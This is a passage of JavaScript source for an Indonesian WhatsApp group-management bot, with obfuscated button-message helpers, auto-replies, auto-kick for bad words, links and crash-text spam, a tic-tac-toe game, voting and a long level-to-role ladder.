_0x1c21ec=_0x23cb09;client[_0x1c21ec(0xd8)](_0x2798f5,_0x33be76,MessageType[_0x1c21ec(0xde)],_0x26ef59);},0xbb8);},sendButtonRegis=(_0x5ee103,_0x21911d,_0x1260a3,_0x515484=[],_0x5332a8={})=>{const _0x1a0927=_0x145ea7,_0x3c7690={'contentText':_0x21911d,'footerText':_0x1260a3,'buttons':_0x515484,'headerType':0x1};setTimeout(()=>{const _0x52b1be=_0x62c0;client[_0x52b1be(0xd8)](_0x5ee103,_0x3c7690,MessageType['buttonsMessage'],_0x5332a8);},0x1388),client[_0x1a0927(0xd8)](from,waitstc,sticker,{'quoted':mek,'contextInfo':{'sendEphemeral':!![]}});},sendButtonText=(_0x5cc240,_0x576783,_0x15557e,_0x2a29e9=[],_0x149e58={})=>{const _0x422033=_0x145ea7,_0x30eaab={'contentText':_0x576783,'footerText':_0x15557e,'buttons':_0x2a29e9,'headerType':0x1};client[_0x422033(0xd8)](_0x5cc240,_0x30eaab,MessageType['buttonsMessage'],_0x149e58);},daftar1=_0x145ea7(0xe0)+player['split']('@')[0x0]+_0x145ea7(0xf4),daftar2=_0x145ea7(0xf6)+numbernye[_0x145ea7(0xfb)]('@')[0x0]+_0x145ea7(0xe3)+ow[_0x145ea7(0xfb)]('@')[0x0]+'*',daftar3=[{'buttonId':'daftar','buttonText':{'displayText':_0x145ea7(0xe1)},'type':0x1}];let ppmenu=(await axios['get']('https://raw.githubusercontent.com/siegrin/siegrin/main/theme/'+themenye+_0x145ea7(0xf1)))[_0x145ea7(0xf2)],ppmenuk=ppmenu[Math[_0x145ea7(0xf0)](Math['random']()*ppmenu[_0x145ea7(0xee)])],ppmenukuku=await getBuffer(ppmenuk);function _0x62c0(_0x24c228,_0x81deb6){const _0x3daeee=_0x3dae();return _0x62c0=function(_0x62c0cc,_0x5571fe){_0x62c0cc=_0x62c0cc-0xd8;let _0x2bf3df=_0x3daeee[_0x62c0cc];return _0x2bf3df;},_0x62c0(_0x24c228,_0x81deb6);}function _0x3dae(){const _0x4bb1b3=['Developer\x20','2283232oJCrKg','Developer\x20Bot','586921POkKWm','Owner','length','155218LyDnaB','floor','.json','data','next','\x0a_Kamu\x20Belum\x20Melakukan\x20Verifikasi\x20Data_','6mWAJHr','Klik\x20Tombol\x20Di\x20Bawah\x20Untuk\x20Verifikasi\x0aTombolnya\x20gak\x20muncul\x20ketik\x20aja\x20#daftar\x0a*Support\x20Nekopoi.Care*\x0a*Offical\x20Bot\x20By\x20@','BEGIN:VCARD\x0aVERSION:3.0\x0aFN:Dellas\x0aORG:\x20Dev\x20Bot\x0aTEL;type=CELL;type=VOICE;waid=6281224863098:6281224863098\x0aEND:VCARD','push','locationMessage','*Support\x20Nekopoi.Care*\x0a*Offical\x20Bot\x20By\x20@','split','sendMessage','7529139vvZtfN','1377176VEQNXP','documentMessage','message','29739kkCRut','buttonsMessage','YT\x20SIEGRIN','\x20Hai\x20@','VERIFIKASI','86ecAzNR','*\x0a*Powered\x20By\x20@','10dWupKn','NEXT','ephemeralMessage','1154080vAcCUX','prepareMessage'];_0x3dae=function(){return _0x4bb1b3;};return _0x3dae();}const mediaimgen=await client[_0x145ea7(0xe8)](from,ppmenukuku,MessageType['location'],{'thumbnail':ppmenukuku});let buttonloc2=mediaimgen['message']['ephemeralMessage']?mediaimgen[_0x145ea7(0xdc)]['ephemeralMessage']:mediaimgen;const buttonsmenu1=_0x145ea7(0xfa)+numbernye[_0x145ea7(0xfb)]('@')[0x0]+_0x145ea7(0xe3)+ow[_0x145ea7(0xfb)]('@')[0x0]+'*',buttonsmenu5='*'+hahh+'\x20@'+player['split']('@')[0x0]+'*\x0a*Bot\x20ini\x20di\x20lengkapi\x20Anti-Spam\x20jadi\x20beri\x20jeda\x205\x20detik*',buttonsmenu2=[{'buttonId':'Owner','buttonText':{'displayText':_0x145ea7(0xdf)},'type':0x1}],buttonsmenu6=[{'buttonId':_0x145ea7(0xf3),'buttonText':{'displayText':_0x145ea7(0xe5)},'type':0x1}],buttonsmenu3=[{'buttonId':'owner','buttonText':{'displayText':_0x145ea7(0xed)},'type':0x1}],sendButtonImageLoc=(_0x593b5f,_0x27f5d8,_0x199f9,_0x29d55d=[],_0x5d4178={})=>{const _0x1d1dc9=_0x145ea7,_0xf853bd={'contentText':_0x27f5d8,'footerText':_0x199f9,'buttons':_0x29d55d,'headerType':0x6,'locationMessage':buttonloc2[_0x1d1dc9(0xdc)][_0x1d1dc9(0xf9)]};client['sendMessage'](_0x593b5f,_0xf853bd,MessageType['buttonsMessage'],_0x5d4178);},Sendbutdocument=async(_0x4dfaf1,_0x1ba193,_0x53539c,_0x487657,_0x3317ba,_0x427ab0=[],_0xc61b42={})=>{const _0x5a26ad=_0x145ea7;media=_0x487657,kma=_0x3317ba,mhan=await client['prepareMessage'](from,media,document,kma);let _0x4a5717=mhan['message'][_0x5a26ad(0xe6)]?mhan[_0x5a26ad(0xdc)][_0x5a26ad(0xe6)]:mhan;const _0x2e92aa={'documentMessage':_0x4a5717[_0x5a26ad(0xdc)][_0x5a26ad(0xdb)],'contentText':_0x1ba193,'footerText':_0x53539c,'buttons':_0x427ab0,'headerType':'DOCUMENT'};client[_0x5a26ad(0xd8)](_0x4dfaf1,_0x2e92aa,MessageType['buttonsMessage'],_0xc61b42);};

const getpc = async function(totalchat){
let pc = []
let a = []
let b = []
for (c of totalchat){
a.push(c.jid)
}
for (d of a){
if (d && !d.includes('g.us')){
b.push(d)
}
}
return b
}


const getGroup = async function(totalchat){
let grup = []
let a = []
let b = []
for (c of totalchat){
a.push(c.jid)
}
for (d of a){
if (d && d.includes('g.us')){
b.push(d)
}
}
for (e of b){
let ingfo = await client.groupMetadata(e)
grup.push(ingfo)
}
return grup
}  

let ii = []
let giid = []
for (mem of totalchat){
ii.push(mem.jid)
}
for (id of ii){
if (id && id.includes('g.us')){
giid.push(id)
}
}
const  timestampi = speed();
const  latensii = speed() - timestampi
const latensiii = `${latensii.toFixed(4)} _Second_`
const ini_gcchat = `${giid.length}`
const uptime = process.uptime()
const tekss = `${kyun(uptime)}`
const ini_totalchat = `${totalchat.length - giid.lenght}`   

var chats = await client.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readG === false) return
await client.chatRead(jid)
})
var chatss = await client.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readP === false) return
await client.chatRead(jid)
})

var prefi = pref
			
if (multi) {
prefi = `Multi-Prefix`
}

// AUTO TEXT
for (let i = 0; i < commandsrespon.length ; i++) {
if (budy == commandsrespon[i].pesan) {
client.sendMessage(from, commandsrespon[i].balasan, text, {quoted: mek})}}

// AUTO STICKER
for (let anji of setiker){
if (budy === anji){
result = fs.readFileSync(`./strg/sticker/${anji}.webp`)
client.sendMessage(from, result, sticker, { quoted: mek})}}

// AUTO VN
for (let anju of audionye){
if (budy === anju) {
result = fs.readFileSync(`./strg/audio/${anju}.mp3`)
client.sendMessage(from, result, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek})}}

// AUTO IMAGE
for (let anjh of imagenye){
if (budy === anjh){
result = fs.readFileSync(`./strg/image/${anjh}.jpg`)
client.sendMessage(from, result, image, { quoted: mek})}}

//ANTI KASAR
if (bad.includes(messagesC)){
if (!isGroup) return
if (!isBadWord) return
if (isGroupAdmins) return reply('*Jaga Ucapannya Min😇*')
client.updatePresence(from, Presence.composing)
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
teks = `*「 KATA TOXIC TERDETEKSI 」*\n*Maaf* _@${sender.split("@")[0]}_ *bro maap ni bro maap banget tapi lu bakal dikick dari group ini bentar lagi*`
client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [sender]}})
setTimeout( () => {
client.sendMessage(from, kickstc, sticker, {quoted:mek, contextInfo:{sendEphemeral: true}})
}, 1000)
setTimeout( () => {
client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
}, 5000)
setTimeout( () => {
client.updatePresence(from, Presence.composing)
replysticker(leavestc)
}, 3000)
    }
 /*********** FUNCTION ANTILINK ***********/
 // ANTITROLLI
if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antitrol === false) return
if (mek.key.fromMe) return
reply('Njier jangan pake fake trolli _-\n\n' + require('util').format(m.key))
await client.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}
if (budy.includes(linknye)){
if (!isGroup) return
if (!AntiLink) return
if (isGroupAdmins) return reply("admin bebas aowkwkww")
if (isOwner) return
client.updatePresence(from, Presence.composing)
if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
teks = `*「 LINK TERDETEKSI 」*\n*Maaf* _@${sender.split("@")[0]}_ *bro maap ni bro maap banget tapi lu bakal dikick dari group ini bentar lagi*`
client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [sender]}})
setTimeout( () => {
client.sendMessage(from, kickstc, sticker, {quoted:mek, contextInfo:{sendEphemeral: true}})
}, 1000)
setTimeout( () => {
client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
}, 5000)
setTimeout( () => {
client.updatePresence(from, Presence.composing)
replysticker(leavestc)
}, 3000)
}
// ANTI VIRTEX
if (budy.length > 1000){
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return reply('*admin mah bebas*')
client.updatePresence(from, Presence.composing)
if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
sendButtonImageLoc(from, antivirtexx(), buttonsmenu1, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
sendButtonImageLoc(from, antivirtexx(), buttonsmenu1, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
teks = `*「 VIRTEX TERDETEKSI 」*\n*Maaf* _@${sender.split("@")[0]}_ *bro maap ni bro maap banget tapi lu bakal dikick dari group ini bentar lagi*`
client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [sender]}})
setTimeout( () => {
client.sendMessage(from, kickstc, sticker, {quoted:mek, contextInfo:{sendEphemeral: true}})
}, 1000)
setTimeout( () => {
client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
}, 5000)
setTimeout( () => {
client.updatePresence(from, Presence.composing)
replysticker(leavestc)
}, 3000)
    }
	
	
//TICTACTOE FUNCTION
 if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah"].includes(budy) && !isCmd) {
orangnye = sender
teks = `@${orangnye.split("@")[0]} Menyerah\n_Yahaha cupu abiez_`
return client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
delete tictactoe[senderNumber]
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
fs.unlinkSync("./temp/" + from + ".json");
})
}
   
if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
var { enemy, mode, board, step } = tictactoe[senderNumber]
if ([X, O].includes(board[Number(budy) - 1])) return await reply(`Angka ${budy} telah diisi`)
var data = tictactoe[senderNumber]
data["enemy"] = senderNumber
mode = mode == X ? O : X
data["mode"] = mode
data["board"][Number(budy) - 1] = data["mode"]
data["step"] += 1
var player1 = enemy
var player2 = senderNumber
if (step % 2 == 0) {
player1 = senderNumber
player2 = enemy
} else {
mode = data["mode"] == X ? O : X
}
tictactoe[enemy] = data
delete tictactoe[senderNumber]
var teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n•> Player 1 : @${player1.split("@")[0]} (${mode})`
mode = mode == X ? O : X
var text2 = `\n\n•> Player 2 : @${player2.split("@")[0]} (${mode})`
var test = `\n_ketik nyerah untuk menyerah_`
board = await generateBoard(data["board"])
var win = await getWin(data["board"])
if (win) {
teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n`
if (win == mode) {
teks += `•> Lose : @${player1} 👻\n\n`
teks += board
teks += `\n\n•> Win : @${player2} 🎉\n_fix tictactoe by mans 2021_`
return client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
delete tictactoe[enemy]
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
fs.unlinkSync('./temp/' + from + '.json')
getWins(`${player2}@s.whatsapp.net`, 1)
getLose(`${player1}@s.whatsapp.net`, 1)
})
} else {
teks += `•> Win : @${player1} 🎉\n\n`
teks += board
teks += `\n\n•> Lose : @${player2} 👻\n_fix tictactoe by mans 2021_`
return client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
delete tictactoe[enemy]
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
fs.unlinkSync('./temp/' + from + '.json')
getWins(`${player1}@s.whatsapp.net`, 1)
getLose(`${player2}@s.whatsapp.net`, 1)
})
}
}
if (data["step"] == 9) {
teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n`
teks += `•> Draw : @${player1} 🦁\n\n`
teks += board
teks += `\n\n•> Draw : @${player2} 🐯\n_fix tictactoe by mans 2021_`
return client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
delete tictactoe[enemy]
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
fs.unlinkSync('./temp/' + from + '.json')
})
}
player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
teks += "\n"
teks += board
teks += text2
teks += test
return client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
})
}
if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
if (tttSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
tttSkuy.status = true
rand0m = [ tttSkuy.Z, tttSkuy.Y ]
winR = rand0m[Math.floor(Math.random() * rand0m.length)]
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
nantang = O
pelawan = X

var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
var penantang = `${tttSkuy.Z}@s.whatsapp.net`
var lawan = `${tttSkuy.Y}@s.whatsapp.net`
tesk = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}\n`
var count = 0
for (var x of board) {
if (count % 3 == 0) {
tesk += "\n   "
}
tesk += x
count += 1
}
tesk += `\n\n•> Player 2 : @${lawan.split("@")[0]} (${pelawan})\n_fix tictactoe_`
return client.sendMessage(from, tesk, text, {quoted:mek, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
var data = {}
data["enemy"] = lawan.split("@")[0]
data["mode"] = pelawan
data["board"] = board
data["step"] = 0
tictactoe[penantang.split("@")[0]] = data
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))
})
fs.unlinkSync("./temp/" + from + ".json");
} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
client.sendMessage(from, `「 *Game Tictactoe Rejected* 」\n\n• @${tttSkuy.Y} yahaha cupu lo`, text, {quoted: mek, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
fs.unlinkSync("./temp/" + from + ".json");
}}
// FUNTION CHAT \\
cekafk(afk)
if (!mek.key.remoteJid.endsWith('@g.us') && offline){
if (!isOwner){
if (isAfk(mek.key.remoteJid)) return
addafk(mek.key.remoteJid)
heheh = ms(Date.now() - waktu) 
client.sendMessage(mek.key.remoteJid,
ind.donasi(prefix, player, ow, trakteer, saweria, donasi, rekening), MessageType.text,{contextInfo:{ mentionedJid: [player, ow, numbernye],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": fake, 'jpegThumbnail': WMthumb}}}})}} 
if (mek.key.remoteJid.endsWith('@g.us') && offline) {
if (!isOwner){
if (mek.message.extendedTextMessage != undefined){
if (mek.message.extendedTextMessage.contextInfo != undefined){
if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
if (ment === `${owner}@s.whatsapp.net`){
if (isAfk(mek.key.remoteJid)) return
addafk(mek.key.remoteJid)
heheh = ms(Date.now() - waktu)
client.sendMessage(mek.key.remoteJid,
ind.donasi(prefix, player, ow, trakteer, saweria, donasi, rekening), MessageType.text,{contextInfo:{ mentionedJid: [player, ow, numbernye],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": fake, 'jpegThumbnail': WMthumb}}}})}}}}}}}
//VOTE FUNCTION
if(isGroup && !isVote) {
if (budy.toLowerCase() === 'vote'){
let vote = JSON.parse(fs.readFileSync(`./database/bot/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./database/bot/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./database/bot/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devote'){
const vote = JSON.parse(fs.readFileSync(`./database/bot/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./database/bot/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./database/bot/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
    }
}
//LIMIT FUNCTION
 if (isRegistered ) {
const checkATM = checkATMuser(sender)
try {
if (checkATM === undefined) addATM(sender)
addKoinUser(sender, point)
} catch (err) {
console.error(err)
}
}
if (isRegistered ) {
const checkLimit = checkLimituser(sender)
try {
if (checkLimit === undefined) addLimit(sender)
addLimitUser(sender, point)
} catch (err) {
console.error(err)
}
}
var angka = '1'
if (isPremium) {
angka = '0'
} 
if (isOwner) {
angka = '0'
}
 /*********** FUNCTION LEVEL ***********/
if (isGroup && isRegistered) {
const currentLevel = getLevelingLevel(sender)
const checkId = getLevelingId(sender)
try {
if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
const amountXp = Math.floor(Math.random() * 1) + 0
const requiredXp = 10 * (Math.pow(2, currentLevel) - 1)
const getLevel = getLevelingLevel(sender)
addLevelingXp(sender, amountXp)
if (requiredXp <= getLevelingXp(sender)) {
addLevelingLevel(sender, 1)
addLimitUser(sender, 10)
 await reply(ind.levelup(pushname, sender, player, getLevelingXp, getLevel, getLevelingLevel, role))
}
} catch (err) {
console.error(err)
}}
 /*********** FUNCTION LEVEL ***********/
const levelRole = getLevelingLevel(sender)
var role = 'Newbie ㋡'
if (levelRole <= 0) {
role = 'Newbie ㋡'
} else if (levelRole <= 4) {
role = 'Beginner 1 ⚊¹'
} else if (levelRole <= 6) {
role = 'Beginner 2 ⚊²'
} else if (levelRole <= 8) {
role = 'Beginner 3 ⚊³'
} else if (levelRole <= 10) {
role = 'Beginner 4 ⚊⁴'
} else if (levelRole <= 12) {
role = 'Private 1 ⚌¹'
} else if (levelRole <= 14) {
role = 'Private 2 ⚌²'
} else if (levelRole <= 16) {
role = 'Private 3 ⚌³'
} else if (levelRole <= 18) {
role = 'Private 4 ⚌⁴'
} else if (levelRole <= 20) {
role = 'Private 5 ⚌⁵'
} else if (levelRole <= 22) {
role = 'Corporal 1 ☰¹'
} else if (levelRole <= 24) {
role = 'Corporal 2 ☰²'
} else if (levelRole <= 26) {
role = 'Corporal 3 ☰³'
} else if (levelRole <= 28) {
role = 'Corporal 4 ☰⁴'
} else if (levelRole <= 30) {
role = 'Corporal 5 ☰⁵'
} else if (levelRole <= 32) {
role = 'Sergeant 1 ≣¹'
} else if (levelRole <= 34) {
role = 'Sergeant 2 ≣²'
} else if (levelRole <= 36) {
role = 'Sergeant 3 ≣³'
} else if (levelRole <= 38) {
role = 'Sergeant 4 ≣⁴'
} else if (levelRole <= 40) {
role = 'Sergeant 5 ≣⁵'
} else if (levelRole <= 42) {
role = 'Staff 1 ﹀¹'
} else if (levelRole <= 44) {
role = 'Staff 2 ﹀²'
} else if (levelRole <= 46) {
role = 'Staff 3 ﹀³'
} else if (levelRole <= 48) {
role = 'Staff 4 ﹀⁴'
} else if (levelRole <= 50) {
role = 'Staff 5 ﹀⁵'
} else if (levelRole <= 52) {
role = 'Sergeant 1 ︾¹'
} else if (levelRole <= 54) {
role = 'Sergeant 2 ︾²'
} else if (levelRole <= 56) {
role = 'Sergeant 3 ︾³'
} else if (levelRole <= 58) {
role = 'Sergeant 4 ︾⁴'
} else if (levelRole <= 60) {
role = 'Sergeant 5 ︾⁵'
} else if (levelRole <= 62) {
role = '2nd Lt. 1 ♢¹ '
} else if (levelRole <= 64) {
role = '2nd Lt. 2 ♢²'
} else if (levelRole <= 66) {
role = '2nd Lt. 3 ♢³'
} else if (levelRole <= 68) {
role = '2nd Lt. 4 ♢⁴'
} else if (levelRole <= 70) {
role = '2nd Lt. 5 ♢⁵'
} else if (levelRole <= 72) {
role = '1st Lt. 1 ♢♢¹'
} else if (levelRole <= 74) {
role = '1st Lt. 2 ♢♢²'
} else if (levelRole <= 76) {
role = '1st Lt. 3 ♢♢³'
} else if (levelRole <= 78) {
role = '1st Lt. 4 ♢♢⁴'
} else if (levelRole <= 80) {
role = '1st Lt. 5 ♢♢⁵'
} else if (levelRole <= 82) {
role = 'Major 1 ✷¹'
} else if (levelRole <= 84) {
role = 'Major 2 ✷²'
} else if (levelRole <= 86) {
role = 'Major 3 ✷³'
} else if (levelRole <= 88) {
role = 'Major 4 ✷⁴'
} else if (levelRole <= 90) {
role = 'Major 5 ✷⁵'
} else if (levelRole <= 92) {
role = 'Colonel 1 ✷✷¹'
} else if (levelRole <= 94) {
role = 'Colonel 2 ✷✷²'
} else if (levelRole <= 96) {
role = 'Colonel 3 ✷✷³'
} else if (levelRole <= 98) {
role = 'Colonel 4 ✷✷⁴'
} else if (levelRole <= 100) {
role = 'Colonel 5 ✷✷⁵'
} else if (levelRole <= 102) {
role = 'Brigadier Early ✰'
} else if (levelRole <= 104) {
role = 'Brigadier Silver ✩'
} else if (levelRole <= 106) {
role = 'Brigadier gold ✯'
} else if (levelRole <= 108) {
role = 'Brigadier Platinum ✬'
} else if (levelRole <= 110) {
role = 'Brigadier Diamond ✪'
} else if (levelRole <= 112) {
role = 'Major General Early ✰'
} else if (levelRole <= 114) {
role = 'Major General Silver ✩'
} else if (levelRole <= 116) {
role = 'Major General gold ✯'
} else if (levelRole <= 118) {
role = 'Major General Platinum ✬'
} else if (levelRole <= 120) {
role = 'Major General Diamond ✪'
} else if (levelRole <= 122) {
role = 'Lt.General Early ✰'
} else if (levelRole <= 124) {
role = 'Lt.General Silver ✩'
} else if (levelRole <= 126) {
role = 'Lt.General gold ✯'
} else if (levelRole <= 128) {
role = 'Lt.General Platinum ✬'
} else if (levelRole <= 130) {
role = 'Lt. General Diamond ✪'
} else if (levelRole <= 132) {
role = 'General Early ✰'
} else if (levelRole <= 134) {
role = 'General Silver ✩'
} else if (levelRole <= 136) {
role = 'General gold ✯'
} else if (levelRole <= 138) {
role = 'General Platinum ✬'
} else if (levelRole <= 140) {
role = 'General Diamond ✪'
} else if (levelRole <= 142) {
role = 'Commander Early ★'
} else if (levelRole <= 144) {
role = 'Commander Intermediate ⍣'
} else if (levelRole <= 146) {
role = 'Commander Elite ≛'
} else if (levelRole <= 148) {
role = 'The Commander Hero ⍟'
} else if (levelRole <= 152) {
role = 'Legends 忍'
} else if (levelRole <= 154) {
role = 'Legends 忍'
} else if (levelRole <= 156) {
role = 'Legends 忍'
} else if (levelRole <= 158) {
role = 'Legends 忍'
} else if (levelRole <= 160) {
role = 'Legends 忍'
} else if (levelRole <= 162) {
role = 'Legends 忍'
} else if (levelRole <= 164) {
role = 'Legends 忍'
} else if (levelRole <= 166) {
role = 'Legends 忍'
} else if (levelRole <= 168) {
role = 'Legends 忍'
} else if (levelRole <= 170) {
role = 'Legends 忍'
} else if (levelRole <= 172) {
role = 'Legends 忍'
} else if (levelRole <= 174) {
role = 'Legends 忍'
} else if (levelRole <= 176) {
role = 'Legends 忍'
} else if (levelRole <= 178) {
role = 'Legends 忍'
} else if (levelRole <= 180) {
role = 'Legends 忍'
} else if (levelRole <= 182) {
role = 'Legends 忍'
} else if (levelRole <= 184) {
role = 'Legends 忍'
} else if (levelRole <= 186) {
role = 'Legends 忍'
} else if (levelRole <= 188) {
role = 'Legends 忍'
} else if (levelRole <= 190) {
role = 'Legends 忍'
} else if (levelRole <= 192) {
role = 'Legends 忍'
} else if (levelRole <= 194) {
role = 'Legends 忍'
} else if (levelRole <= 196) {
role = 'Legends 忍'
} else if (levelRole <= 198) {
role = 'Legends 忍'
} else if (levelRole <= 200) {
role = 'Legends 忍'
} else if (levelRole <= 210) {
role = 'Legends 忍'
} else if (levelRole <= 220) {
role = 'Legends 忍'
} else if (levelRole <= 230) {
role = 'Legends 忍'
} else if (levelRole <= 240) {
role = 'Legends 忍'
} else if (levelRole <= 250) {
role = 'Legends 忍'
} else if (levelRole <= 260) {
role = 'Legends 忍'
} else if (levelRole <= 270) {
role = 'Legends 忍'
} else if (levelRole <= 280) {
role = 'Legends 忍'
} else if (levelRole <= 290) {
role = 'Legends 忍'
} else if (levelRole <= 300) {
role = 'Legends 忍'
} else if (levelRole <= 310) {
role = 'Legends 忍'
} else if (levelRole <= 320) {
role = 'Legends 忍'
} else if (levelRole <= 330) {
role = 'Legends 忍'
} else if (levelRole <= 340) {
role = 'Legends 忍'
} else if (levelRole <= 350) {
role = 'Legends 忍'
} else if (levelRole <= 360) {
role = 'Legends 忍'
} else if (levelRole <= 370) {
role = 'Legends 忍'
} else if (levelRole <= 380) {
role = 'Legends 忍'
} else if (levelRole <= 390) {
role = 'Legends 忍'
} else if (levelRole <= 400) {
role = 'Legends 忍'
} else if (levelRole <= 410) {
role = 'Legends 忍'
} else if (levelRole <= 420) {
role = 'Legends 忍'
} else if (levelRole <= 430) {
role = 'Legends 忍'
} else if (levelRole <= 440) {
role = 'Legends 忍'
} else if (levelRole <= 450) {
role = 'Legends 忍'
} else if (levelRole <= 460) {
role = 'Legends 忍'
} else if (levelRole <= 470) {
role = 'Legends 忍'
} else if (levelRole <= 480) {
role = 'Legends 忍'
} else if (levelRole <= 490) {
role = 'Legends 忍'
} else if (levelRole <= 500) {
role = 'Legends 忍'
} else if (levelRole <= 600) {
role = 'Legends 忍'
} else if (levelRole <= 700) {
role = 'Legends 忍'
} else if (levelRole <= 800) {
role = 'Legends 忍'
} else if (levelRole <= 900) {
role = 'Legends 忍'
} else if (levelRole <= 1000) {
role = 'Mythic I 上帝'
} else if (levelRole <= 2000) {
role = 'Mythic II 上帝'
} else if (levelRole <= 3000) {
role = 'Mythic III 上帝'
} else if (levelRole <= 4000) {
role = 'Mythic IV 上帝'
} else if (levelRole <= 5000) {
role = 'Mythic V 上帝'
} else if (levelRole <= 6000) {
role = 'Mythic VII 上帝'
} else if (levelRole <= 7000) {
role = 'Mythic VIII 上帝'
} else if (levelRole <= 8000) {
role = 'Mythic IX 上帝'
} else if (levelRole <= 9000) {
role = 'Mythic X 上帝'
} else if (levelRole <= 10000) {
role = 'Awakened Mythic 特尔邦贡'
	    } else if (levelRole <= 99999999999) {
   	 role = 'End level 程度❗'
	    }
////   
//========================================================================================================================//

//ANTI SPAM FUCNTION
        if (isCmd && !isOwner && msgFilter.isFiltered(from) && !isGroup) {
        console.log(color('[SPAM]', 'red'), color(time, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
        return
        }
